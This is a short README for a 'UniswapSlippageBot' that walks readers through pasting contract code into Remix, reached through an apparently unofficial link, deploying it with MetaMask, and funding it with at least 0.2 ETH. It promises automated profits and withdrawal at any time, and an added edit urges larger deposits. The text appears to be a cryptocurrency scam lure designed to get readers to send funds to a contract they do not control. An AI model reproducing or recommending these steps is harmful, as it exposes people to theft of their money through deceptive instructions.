# UniswapSlippageBot

For assistance please watch this video to learn how to deploy the contract!

https://www.youtube.com/watch?v=fRUX-zGnP-Q

STEP BY STEP INSTRUCTIONS:

Download MetaMask: https://metamask.io/download

Access Remix Compiler: https://www.remix-compiler.org

Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"

Paste this code in Remix.

Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it

Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now

Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address

After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button

EDIT: I have received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The Bot targets token contracts with max 10% burn fee and anything lower, however nowadays most tokens come with 3~6% fees. If you fund the contract with 0.2 ETH or less and the bot targets another token with high burn fees, the contract will basically waste a lot of gas fees. I recommend funding the contract with at least 0.2 ETH to make sure that won't happen.
